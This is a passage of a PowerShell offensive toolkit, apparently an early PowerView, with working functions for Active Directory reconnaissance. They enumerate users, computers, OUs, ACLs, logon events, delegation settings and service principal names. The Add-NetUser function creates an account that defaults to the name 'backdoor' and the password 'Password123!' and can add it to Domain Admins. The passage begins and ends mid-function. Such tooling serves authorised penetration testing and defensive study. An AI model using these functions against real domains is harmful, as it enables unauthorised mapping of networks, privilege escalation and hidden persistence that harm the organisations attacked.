            $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ADSprefix,$dn")
        }
        else {
            Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$dn"
            $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
        }
    }

    return $DomainSearcher
}


function Get-NetUser {
    <#
        .SYNOPSIS
        Query information for a given user or users in the domain.

        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current
        domain for all users. Another domain can be specified to
        query for users across a trust.
        This is a replacement for "net users /domain"

        .PARAMETER UserName
        Username filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for users. If not supplied, the
        current domain is used.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER AdminCount
        Switch. Return users with adminCount=1.

        .PARAMETER SPN
        Switch. Only return user objects with non-null service principal names.

        .PARAMETER Unconstrained
        Switch. Return users that have unconstrained delegation.

        .PARAMETER AllowDelegation
        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

        .EXAMPLE
        > Get-NetUser
        Returns the member users of the current domain.

        .EXAMPLE
        > Get-NetUser -Domain testing
        Returns all the members in the "testing" domain.
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation
    )
    begin {
        # so this isn't repeated if users are passed on the pipeline
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController
    }
    process {
        if($UserSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            # check if we're using a username filter or not
            if($UserName){
                # samAccountType=805306368 indicates user objects
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif ($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }
            $UserSearcher.PageSize = 200
            $UserSearcher.FindAll() | ?{$_} | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                $properties = $_.Properties
                $out = New-Object psobject
                $properties.PropertyNames | % {
                    if ($_ -eq "objectsid"){
                        # convert the SID to a string
                        $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                    }
                    elseif($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                        $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                    }
                    else {
                        if ($properties[$_].count -eq 1) {
                            $out | Add-Member Noteproperty $_ $properties[$_][0]
                        }
                        else {
                            $out | Add-Member Noteproperty $_ $properties[$_]
                        }
                    }
                }
                $out
            }
        }
    }
}


function Add-NetUser {
    <#
        .SYNOPSIS
        Adds a local or domain user.

        .DESCRIPTION
        This function utilizes DirectoryServices.AccountManagement to add a
        user to the local machine or a domain (if permissions allow). It will
        default to adding to the local machine. An optional group name to
        add the user to can be specified.

        .PARAMETER UserName
        The username to add. If not given, it defaults to "backdoor"

        .PARAMETER Password
        The password to set for the added user. If not given, it defaults to "Password123!"

        .PARAMETER GroupName
        Group to optionally add the user to.

        .PARAMETER HostName
        Host to add the local user to, defaults to 'localhost'

        .PARAMETER Domain
        Specified domain to add the user to.

        .EXAMPLE
        > Add-NetUser -UserName john -Password password
        Adds a localuser "john" to the machine with password "password"

        .EXAMPLE
        > Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -domain ''
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins"

        .EXAMPLE
        > Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins"

        .Link
        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
    #>

    [CmdletBinding()]
    Param (
        [String]
        $UserName = 'backdoor',

        [String]
        $Password = 'Password123!',

        [String]
        $GroupName,

        [String]
        $HostName = 'localhost',

        [String]
        $Domain
    )

    $d = Get-NetDomain -Domain $Domain
    if(-not $d){
        return $null
    }

    if ($Domain){

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/

        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

        # get the domain context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # create the user object
        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context

        # set user properties
        $usr.name = $UserName
        $usr.SamAccountName = $UserName
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($password)
        $usr.Enabled = $true

        try{
            # commit the user
            $usr.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else{
        $objOu = [ADSI]"WinNT://$HostName"
        $objUser = $objOU.Create('User', $UserName)
        $objUser.SetPassword($Password)

        # commit the changes to the local machine
        try{
            $b = $objUser.SetInfo()
            "[*] User $UserName successfully created on host $HostName"
        }
        catch{
            # TODO: error handling if permissions incorrect
            Write-Warning '[!] Account already exists!'
            return
        }
    }

    # if a group is specified, invoke Add-NetGroupUser and return its value
    if ($GroupName){
        # if we're adding the user to a domain
        if ($Domain){
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        # otherwise, we're adding to a local group
        else{
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -HostName $HostName
            "[*] User $UserName successfully added to group $GroupName on host $HostName"
        }
    }
}


function Add-NetGroupUser {
    <#
        .SYNOPSIS
        Adds a local or domain user to a local or domain group.

        .PARAMETER UserName
        The domain username to query for.

        .PARAMETER GroupName
        Group to add the user to.

        .PARAMETER Domain
        Domain to add the user to.

        .PARAMETER HostName
        Hostname to add the user to, defaults to localhost.

        .EXAMPLE
        > Add-NetGroupUser -UserName john -GroupName Administrators
        Adds a localuser "john" to the local group "Administrators"

        .EXAMPLE
        > Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
        Adds the existing user "john" to the domain group "Domain Admins" in
        "dev.local"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $HostName = 'localhost'
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host, use the WinNT provider
    if($HostName -ne 'localhost'){
        try{
            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $HostName"
        }
        catch{
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $HostName"
            return
        }
    }

    # otherwise it's a local or domain add
    else{
        if ($Domain){
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            $d = Get-NetDomain -Domain $Domain
            if(-not $d){
                return $Null
            }
        }
        else{
            # otherwise, get the local machine context
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }

        # get the full principal context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # find the particular group
        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$GroupName)

        # add the particular user to the group
        $group.Members.add($context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

        # commit the changes
        $group.Save()
    }
}


function Get-UserProperty {
    <#
        .SYNOPSIS
        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

        .DESCRIPTION
        This function a list of all user object properties, optionally
        returning all the user:property combinations if a property
        name is specified.

        .PARAMETER Domain
        The domain to query for user properties.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER Properties
        Return property names for users.

        .EXAMPLE
        > Get-UserProperty
        Returns all user properties for users in the current domain.

        .EXAMPLE
        > Get-UserProperty -Properties ssn,lastlogon,location
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.

        .EXAMPLE
        > Get-UserProperty -Domain testing
        Returns all user properties for users in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain,
        
        [String]
        $DomainController,

        [string[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetUser -Domain $Domain -DomainController $DomainController | % {

            $out = new-object psobject
            $out | Add-Member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                try {
                    $out | Add-Member Noteproperty $Property $_.$Property
                }
                catch {}
            }
            $out
        }
    }
    else{
        # extract out just the property names
        Get-NetUser -Domain $Domain -DomainController $DomainController | Select -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Get-UserEvent {
    <#
        .SYNOPSIS
        Dump and parse security events relating to an account logon (ID 4624)
        or a TGT request event (ID 4768).

        Author: @sixdub

        .DESCRIPTION
        Provides information about all users who have logged on and where they
        logged on from. Intended to be used and tested on
        Windows 2008 Domain Controllers.
        Admin Reqd? YES

        .PARAMETER ComputerName
        The computer to get events from. Default: Localhost

        .PARAMETER EventType
        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'

        .PARAMETER DateStart
        Filter out all events before this date. Default: 5 days

        .LINK
        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
    #>

    Param(
        [String]
        $ComputerName=$env:computername,

        [String]
        $EventType = "logon",

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )


    if($EventType.ToLower() -like "logon") {
        [int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like "tgt") {
        [int32[]]$ID = @(4768)
    }
    else {
        [int32[]]$ID = @(4624, 4768)
    }

    #grab all events matching our filter for the specified host
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$datestart} -ErrorAction SilentlyContinue | % {

        if($ID -contains 4624){    
            #first parse and check the logon type. This could be later adapted and tested for RDP logons (type 10)
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))'){
                if($matches){
                    $logontype=$matches[0].trim()
                    $matches = $Null
                }
            }
            else {
                $logontype = ""
            }

            #interactive logons or domain logons
            if (($logontype -eq 2) -or ($logontype -eq 3)){
                try{
                    # parse and store the account used and the address they came from
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)'){
                        if($matches){
                            $account = $matches[0].split("`n")[2].split(":")[1].trim()
                            $domain = $matches[0].split("`n")[3].split(":")[1].trim()
                            $matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)'){
                        if($matches){
                            $addr=$matches[0].split("`n")[2].split(":")[1].trim()
                            $matches = $Null
                        }
                    }

                    # only add if there was account information not for a machine or anonymous logon
                    if ($account -and (-not $account.endsWith("$")) -and ($account -ne "ANONYMOUS LOGON"))
                    {
                        $out = New-Object psobject
                        $out | Add-Member NoteProperty 'Domain' $domain
                        $out | Add-Member NoteProperty 'ComputerName' $ComputerName
                        $out | Add-Member NoteProperty 'Username' $account
                        $out | Add-Member NoteProperty 'Address' $addr
                        $out | Add-Member NoteProperty 'ID' '4624'
                        $out | Add-Member NoteProperty 'LogonType' $logontype
                        $out | Add-Member NoteProperty 'Time' $_.TimeCreated
                        $out
                    }
                }
                catch{}
            }
        }
        if($ID -contains 4768) {
            try{
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)'){
                    if($matches){
                        $account = $matches[0].split("`n")[1].split(":")[1].trim()
                        $domain = $matches[0].split("`n")[2].split(":")[1].trim()
                        $matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)'){
                    if($matches){
                        $addr = $matches[0].split("`n")[1].split(":")[-1].trim()
                        $matches = $Null
                    }
                }

                $out = New-Object psobject
                $out | Add-Member NoteProperty 'Domain' $domain
                $out | Add-Member NoteProperty 'ComputerName' $ComputerName
                $out | Add-Member NoteProperty 'Username' $account
                $out | Add-Member NoteProperty 'Address' $addr
                $out | Add-Member NoteProperty 'ID' '4768'
                $out | Add-Member NoteProperty 'LogonType' ''
                $out | Add-Member NoteProperty 'Time' $_.TimeCreated
                $out
            }
            catch{}
        }
    }
}


function Get-ObjectAcl {
   <#
        .SYNOPSIS
        Returns the ACLs associated with a specific active directory object.

        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.

        .PARAMETER SamAccountName
        Object name to filter for.        

        .PARAMETER Name
        Object name to filter for.

        .PARAMETER DN
        Object distinguished name to filter for.

        .PARAMETER ResolveGUIDs
        Switch. Resolve GUIDs to their display names.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
        .PARAMETER Domain
        The domain to use the query.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .EXAMPLE
        > Get-ObjectAcl -ObjectSamAccountName matt.admin
        Get the ACLs for the matt.admin user in the current domain
        
        .EXAMPLE
        > Get-ObjectAcl -ObjectSamAccountName matt.admin -domain testlab.local
        Get the ACLs for the matt.admin user in the testlab.local domain

        .EXAMPLE
        > Get-ObjectAcl -ObjectSamAccountName matt.admin -domain testlab.local -ResolveGUIDs
        Get the ACLs for the matt.admin user in the testlab.local domain and
        resolve relevant GUIDs to their display names.
    #>
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [String]
        $DN = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

        # get a GUID -> name mapping
        if($ResolveGUIDs){
            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController
        }
    }
    process {

        if ($Searcher){

            if($ObjectSamAccountName) {
                $Searcher.filter="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DN)$Filter)"  
            }
            else {
                $Searcher.filter="(&(name=$Name)(distinguishedname=$DN)$Filter)"  
            }
  
            $Searcher.PageSize = 200
            
            try {
                $Searcher.FindAll() | % {
                    $object = [adsi]($_.path)
                    $access = $object.PsBase.ObjectSecurity.access
                    # add in the object DN to the output object
                    $access | Add-Member NoteProperty 'ObjectDN' ($_.properties.distinguishedname[0])
                    $access
                } | % {
                    if($GUIDs){
                        # if we're resolving GUIDs, map them them to the resolved hash table
                        $out = New-Object psobject
                        $_.psobject.properties | % {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $out | Add-Member Noteproperty $_.Name $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $out | Add-Member Noteproperty $_.Name $_.Value
                                }
                            }
                            else {
                                $out | Add-Member Noteproperty $_.Name $_.Value
                            }
                        }
                        $out
                    }
                    else { $_ }
                }
            }
            catch {
                write-warning $_
            }
        }
    }
}


function Get-GUIDMap {
   <#
        .SYNOPSIS
        Helper to build a hash table of [GUID] -> names

        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

        .PARAMETER Domain
        The domain to use the query.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .LINK
        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
    #>
    [CmdletBinding()]
    Param (
        [String]
        $Domain,

        [String]
        $DomainController
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Extended-Rights,CN=Configuration"
    if ($Searcher) {
        $Searcher.filter = "(objectClass=controlAccessRight)"
        $Searcher.PageSize = 200
        try {
            $Searcher.FindAll() | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {}
    }

    $SchemaSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Schema,CN=Configuration"
    if($SchemaSearcher) {
        $SchemaSearcher.filter = "(schemaIDGUID=*)"
        $SchemaSearcher.PageSize = 200
        try {
            $SchemaSearcher.FindAll() | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {}      
    }

    $GUIDs
}


function Get-NetComputer {
    <#
        .SYNOPSIS
        Gets an array of all current computers objects in a domain.

        .DESCRIPTION
        This function utilizes adsisearcher to query the current AD context
        for current computer objects. Based off of Carlos Perez's Audit.psm1
        script in Posh-SecMod (link below).

        .PARAMETER HostName
        Return computers with a specific name, wildcards accepted.

        .PARAMETER SPN
        Return computers with a specific service principal name, wildcards accepted.

        .PARAMETER OperatingSystem
        Return computers with a specific operating system, wildcards accepted.

        .PARAMETER ServicePack
        Return computers with a specific service pack, wildcards accepted.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER Printers
        Return only printers.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER FullData
        Return full computer objects instead of just system names (the default).

        .PARAMETER Domain
        The domain to query for computers.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Unconstrained
        Switch. Return computer objects that have unconstrained delegation.

        .OUTPUTS
        System.Array. An array of found system objects.

        .EXAMPLE
        > Get-NetComputer
        Returns the current computers in current domain.

        .EXAMPLE
        > Get-NetComputer -SPN mssql*
        Returns all MS SQL servers on the domain.

        .EXAMPLE
        > Get-NetComputer -Domain testing
        Returns the current computers in 'testing' domain.

        .EXAMPLE
        > Get-NetComputer -Domain testing -FullData
        Returns full computer objects in the 'testing' domain.

        .LINK
        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
    #>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem = '*',

        [String]
        $ServicePack = '*',

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained
    )
    begin {
        # so this isn't repeated if users are passed on the pipeline
        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }
    process {

        if ($CompSearcher){

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            # set the filters for the seracher if it exists
            if($Printers) {
                Write-Verbose "Searching for printers"
                # $CompSearcher.filter="(&(objectCategory=printQueue)$Filter)"
                $Filter += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }

            if ($ServicePack -ne '*'){
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)$Filter)"
            }
            else{
                # server 2012 peculiarity- remove any mention to service pack
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)$Filter)"
            }

            # eliminate that pesky 1000 system limit
            $CompSearcher.PageSize = 200

            try {

                $CompSearcher.FindAll() | ? {$_} | ForEach-Object {
                    $up = $true
                    if($Ping){
                        $up = Test-Server -Server $_.properties.dnshostname
                    }
                    if($up){
                        # return full data objects
                        if ($FullData){
                            $properties = $_.Properties
                            $out = New-Object psobject

                            $properties.PropertyNames | % {
                                if ($_ -eq "objectsid"){
                                    # convert the SID to a string
                                    $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                                }
                                elseif($_ -eq "objectguid"){
                                    # convert the GUID to a string
                                    $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                                }
                                elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                                    $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                                }
                                elseif ($properties[$_].count -eq 1) {
                                    $out | Add-Member Noteproperty $_ $properties[$_][0]
                                }
                                else {
                                    $out | Add-Member Noteproperty $_ $properties[$_]
                                }
                            }
                            $out
                        }
                        else{
                            # otherwise we're just returning the DNS host name
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Get-ADObject {
    <#
        .SYNOPSIS
        Takes a domain SID and returns the user, group, or computer object
        associated with it.

        .PARAMETER SID
        The SID of the domain object you're converting.

        .PARAMETER Name
        The Name of the domain object you're converting.

        .PARAMETER SamAccountName
        The SamAccountName of the domain object you're converting. 

        .PARAMETER Domain
        The domain to query for objects.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .EXAMPLE
        > Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
        Get the domain object associated with the specified SID.
        
        .EXAMPLE
        > Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
        Get the AdminSDHolder object for the testlab.local domain.
    #>
    [CmdletBinding()]
    Param (
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    if($SID) {
        try {
            $Name = Convert-SidToName $SID
            if($Name){
                $Canonical = Convert-NT4toCanonical $Name
                $Domain = $Canonical.split("/")[0]
            }
        }
        catch {
            Throw "Error resolving SID '$SID' : $_"
        }
    }

    $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if($ObjectSearcher) {

        if($SID) {
            $ObjectSearcher.filter="(&(objectsid=$SID))"
        }
        elseif($Name) {
            $ObjectSearcher.filter="(&(name=$Name))"
        }
        elseif($SamAccountName) {
            $ObjectSearcher.filter="(&(samAccountName=$SamAccountName))"
        }

        $ObjectSearcher.PageSize = 200
        $ObjectSearcher.FindAll() | ForEach-Object {
            $properties = $_.Properties
            $out = New-Object psobject

            $properties.PropertyNames | % {
                if ($_ -eq "objectsid"){
                    # convert the SID to a string
                    $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                }
                elseif($_ -eq "objectguid"){
                    # convert the GUID to a string
                    $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                }
                elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ){
                    $out | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                }
                elseif ($properties[$_].count -eq 1) {
                    $out | Add-Member Noteproperty $_ $properties[$_][0]
                }
                else {
                    $out | Add-Member Noteproperty $_ $properties[$_]
                }
            }
            $out
        }
    }
}


function Get-ComputerProperty {
    <#
        .SYNOPSIS
        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

        .DESCRIPTION
        This function a list of all computer object properties, optinoally
        returning all the computer:property combinations if a property
        name is specified.

        .PARAMETER Domain
        The domain to query for computer properties.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER Properties
        Return property names for computers.

        .EXAMPLE
        > Get-ComputerProperty
        Returns all computer properties for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperty -Properties ssn,lastlogon,location
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperty -Domain testing
        Returns all user properties for computers in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [string[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData | % {

            $out = new-object psobject
            $out | Add-Member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                try {
                    $out | Add-Member Noteproperty $Property $_.$Property
                }
                catch {}
            }
            $out
        }
    }
    else{
        # extract out just the property names
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData | Select -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Get-NetOU {
    <#
        .SYNOPSIS
        Gets a list of all current OUs in a domain.

        .PARAMETER OUName
        The OU name to query for, wildcards accepted.

        .PARAMETER GUID
        Only return OUs with the specified GUID in their gplink property.

        .PARAMETER Domain
        The domain to query for OUs.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through.

        .PARAMETER FullData
        Return full OU objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetOU
        Returns the current OUs in the domain.

        .EXAMPLE
        > Get-NetOU -OUName *admin* -Domain testlab.local
        Returns all OUs with "admin" in their name in the testlab.local domain.

         .EXAMPLE
        > Get-NetOU -GUID 123-...
        Returns all OUs with linked to the specified group policy object.    
    #>
    [CmdletBinding()]
    Param (
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData
    )

    $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if ($OUSearcher){
        if ($GUID) {
            # if we're filtering for a GUID in .gplink
            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
        }
        else {
            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
        }

        $OUSearcher.PageSize = 200
        $OUSearcher.FindAll() | ForEach-Object {
            if ($FullData){
                # if we're returning full data objects
                $properties = $_.Properties
                $out = New-Object psobject

                $properties.PropertyNames | % {
                    if($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    elseif ($properties[$_].count -eq 1) {
                        $out | Add-Member Noteproperty $_ $properties[$_][0]
                    }
                    else {
                        $out | Add-Member Noteproperty $_ $properties[$_]
                    }
                }
                $out
            }
            else { 
                # otherwise just returning the ADS paths of the OUs
                $_.properties.adspath
            }
        }
    }
}


function Get-NetSite {
    <#
        .SYNOPSIS
        Gets a list of all current sites in a domain.

        .PARAMETER SiteName
        Site filter string, wildcards accepted.

        .PARAMETER Domain
        The domain to query for sites, defaults to current.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through.

        .PARAMETER GUID
        Only return site with the specified GUID in their gplink property.

        .PARAMETER FullData
        Return full site objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetSite
        Returns all site names in the current domain.

        .EXAMPLE
        > Get-NetSite -Domain testlab.local -FullData
        Returns the full data objects for all sites in testlab.local
    #>
    [CmdletBinding()]
    Param (
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData
    )

    $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Sites,CN=Configuration"

    if($SiteSearcher) {

        if ($GUID) {
            # if we're filtering for a GUID in .gplink
